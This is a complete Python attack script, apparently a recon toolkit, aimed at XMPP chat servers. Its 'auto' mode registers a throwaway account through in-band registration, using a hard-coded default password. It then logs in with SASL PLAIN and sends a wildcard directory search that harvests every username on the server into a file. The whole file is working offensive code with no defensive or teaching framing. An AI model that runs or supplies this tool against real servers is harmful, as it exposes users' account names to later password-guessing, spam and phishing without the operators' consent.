#!/usr/bin/env python3
import argparse
import base64
import re
import socket
import sys

def recv_until(sock, delimiter, timeout=10):
    sock.settimeout(timeout)
    buffer = []
    delim_bytes = delimiter.encode("utf-8")
    while True:
        try:
            part = sock.recv(4096)
            if not part:
                break
            buffer.append(part)
            if delim_bytes in part:
                break
        except socket.timeout:
            break
    return b"".join(buffer).decode("utf-8", errors="ignore")

def generate_sasl_plain(username, password):
    token = f"\x00{username}\x00{password}".encode("utf-8")
    return base64.b64encode(token).decode("utf-8")

def init_stream(sock, domain):
    init_stanza = (
        f"<stream:stream to='{domain}' xmlns='jabber:client' "
        f"xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
    )
    sock.sendall(init_stanza.encode("utf-8"))
    return recv_until(sock, "</stream:features>")

def register_account(sock, domain, username, password):
    reg_stanza = (
        f"<iq type='set' id='reg_init' to='{domain}'>"
        f"<query xmlns='jabber:iq:register'>"
        f"<username>{username}</username>"
        f"<password>{password}</password>"
        f"</query></iq>"
    )
    sock.sendall(reg_stanza.encode("utf-8"))
    resp = recv_until(sock, "</iq>")
    
    if "type='result'" in resp or 'type="result"' in resp:
        return True, resp
    else:
        error_match = re.search(r'<error[^>]*>(.*?)</error>', resp, re.DOTALL)
        err_msg = error_match.group(1) if error_match else resp
        return False, err_msg

def authenticate_and_bind(sock, domain, username, password):
    auth_payload = generate_sasl_plain(username, password)
    auth_stanza = (
        f"<auth xmlns='urn:ietf:params:xml:ns:xmpp-sasl' mechanism='PLAIN'>{auth_payload}</auth>"
    )
    sock.sendall(auth_stanza.encode("utf-8"))
    auth_resp = recv_until(sock, ">")
    if "failure" in auth_resp:
        return False, "SASL authentication failed"

    # Reset stream following RFC 6120
    reset_stanza = (
        f"<stream:stream from='{username}@{domain}' to='{domain}' "
        f"version='1.0' xml:lang='en' xmlns='jabber:client' "
        f"xmlns:stream='http://etherx.jabber.org/streams'>"
    )
    sock.sendall(reset_stanza.encode("utf-8"))
    recv_until(sock, "</stream:features>")

    # Resource binding
    bind_stanza = (
        "<iq id='bind_exec' type='set'>"
        "<bind xmlns='urn:ietf:params:xml:ns:xmpp-bind'>"
        "<resource>recon</resource>"
        "</bind></iq>"
    )
    sock.sendall(bind_stanza.encode("utf-8"))
    bind_resp = recv_until(sock, "</iq>")
    if "type='result'" not in bind_resp and 'type="result"' not in bind_resp:
        return False, "Resource binding failed"
    
    return True, "Authenticated and bound"

def execute_search(sock, search_service):
    search_stanza = (
        f"<iq type='set' to='{search_service}' xmlns='jabber:client'>"
        f"<query xmlns='jabber:iq:search'>"
        f"<x xmlns='jabber:x:data' type='submit'>"
        f"<field var='search'><value>*</value></field>"
        f"<field var='Username'><value>1</value></field>"
        f"</x></query></iq>"
    )
    sock.sendall(search_stanza.encode("utf-8"))
    raw_results = recv_until(sock, "</iq>")
    
    pattern = re.compile(r'<field var="Username"><value>(.*?)</value></field>')
    return sorted(list(set(pattern.findall(raw_results))))

def connect(target, port):
    try:
        sock = socket.create_connection((target, port), timeout=10)
        return sock
    except socket.error as e:
        sys.exit(f"[-] Connection failed to {target}:{port} - {e}")

def main():
    parser = argparse.ArgumentParser(
        description="XMPP In-Band Registration (XEP-0077) & User Enumeration (XEP-0055) Toolkit",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-t", "--target", required=True, help="Target host IP or FQDN")
    parser.add_argument("-P", "--port", type=int, default=5222, help="Target TCP port (default: 5222)")
    parser.add_argument("-d", "--domain", help="XMPP Domain (defaults to --target)")
    
    subparsers = parser.add_subparsers(dest="command", required=True)

    # Subcommand: register
    reg_parser = subparsers.add_parser("register", help="Register a new account via In-Band Registration (XEP-0077)")
    reg_parser.add_argument("-u", "--user", required=True, help="Username to register")
    reg_parser.add_argument("-p", "--password", required=True, help="Password for registration")

    # Subcommand: enum
    enum_parser = subparsers.add_parser("enum", help="Enumerate users using valid credentials via XEP-0055")
    enum_parser.add_argument("-u", "--user", required=True, help="Username to authenticate with")
    enum_parser.add_argument("-p", "--password", required=True, help="Password for authentication")
    enum_parser.add_argument("-s", "--search-service", help="Search component domain (default: search.<domain>)")
    enum_parser.add_argument("-o", "--output", default="usernames.txt", help="Output file (default: usernames.txt)")

    # Subcommand: auto (Pipeline: register -> authenticate -> dump users)
    auto_parser = subparsers.add_parser("auto", help="Automate registration followed by instant directory dump")
    auto_parser.add_argument("-u", "--user", default="recon_temp", help="Temporary account username (default: recon_temp)")
    auto_parser.add_argument("-p", "--password", default="P@ssw0rd123!", help="Temporary account password")
    auto_parser.add_argument("-s", "--search-service", help="Search component domain (default: search.<domain>)")
    auto_parser.add_argument("-o", "--output", default="usernames.txt", help="Output file (default: usernames.txt)")

    args = parser.parse_args()
    domain = args.domain if args.domain else args.target

    if args.command == "register":
        sock = connect(args.target, args.port)
        init_stream(sock, domain)
        success, msg = register_account(sock, domain, args.user, args.password)
        sock.close()
        if success:
            print(f"[+] User '{args.user}@{domain}' successfully registered.")
        else:
            sys.exit(f"[-] Registration failed: {msg}")

    elif args.command == "enum":
        search_svc = args.search_service if args.search_service else f"search.{domain}"
        sock = connect(args.target, args.port)
        init_stream(sock, domain)
        auth_ok, msg = authenticate_and_bind(sock, domain, args.user, args.password)
        if not auth_ok:
            sock.close()
            sys.exit(f"[-] {msg}")
        print(f"[+] Authenticated as '{args.user}@{domain}'. Executing directory query on '{search_svc}'...")
        users = execute_search(sock, search_svc)
        sock.close()
        
        if not users:
            print("[-] No usernames parsed from directory search response.")
            return
        
        print(f"[+] Harvested {len(users)} user(s).")
        with open(args.output, "w") as f:
            for u in users:
                f.write(f"{u}\n")
        print(f"[+] Output written to {args.output}")

    elif args.command == "auto":
        search_svc = args.search_service if args.search_service else f"search.{domain}"
        sock = connect(args.target, args.port)
        init_stream(sock, domain)
        
        print(f"[*] Attempting in-band registration for '{args.user}'...")
        reg_ok, reg_msg = register_account(sock, domain, args.user, args.password)
        if not reg_ok:
            print(f"[!] Registration returned: {reg_msg}. Attempting login anyway...")
        else:
            print(f"[+] Registered '{args.user}'.")
            # Close and reopen stream for clean SASL state machine execution
            sock.close()
            sock = connect(args.target, args.port)
            init_stream(sock, domain)

        auth_ok, auth_msg = authenticate_and_bind(sock, domain, args.user, args.password)
        if not auth_ok:
            sock.close()
            sys.exit(f"[-] Authentication failed: {auth_msg}")
        
        print(f"[+] Logged in. Dumping directory via {search_svc}...")
        users = execute_search(sock, search_svc)
        sock.close()

        if users:
            print(f"[+] Harvested {len(users)} user(s).")
            with open(args.output, "w") as f:
                for u in users:
                    f.write(f"{u}\n")
            print(f"[+] Output saved to {args.output}")
        else:
            print("[-] Directory search completed with 0 results.")

if __name__ == "__main__":
    main()
